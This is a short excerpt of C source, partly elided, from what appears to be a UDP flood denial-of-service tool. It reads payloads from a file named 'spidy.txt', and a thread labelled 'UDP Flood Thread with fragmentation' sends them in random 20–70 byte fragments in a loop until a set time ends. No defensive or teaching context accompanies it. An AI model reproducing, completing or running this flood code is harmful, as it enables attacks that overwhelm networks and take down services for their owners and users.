...
void load_payloads() {
    ...
    if (!fp) {
        perror("Failed to open spidy.txt");
        exit(EXIT_FAILURE);
    }
...
// UDP Flood Thread with fragmentation
void *flood(void *arg) {
    ...
    while (time(NULL) < end) {
        ...
        char *data = payloads[index];
        int length = payload_lengths[index];
        int sent = 0;

        while (sent < length) {
            int frag_len = 20 + rand() % 50; // simulate fragment of 20–70 bytes
            if (sent + frag_len > length) frag_len = length - sent;
            sendto(sock, data + sent, frag_len, 0, (struct sockaddr *)&addr, sizeof(addr));
            sent += frag_len;
        }
    }
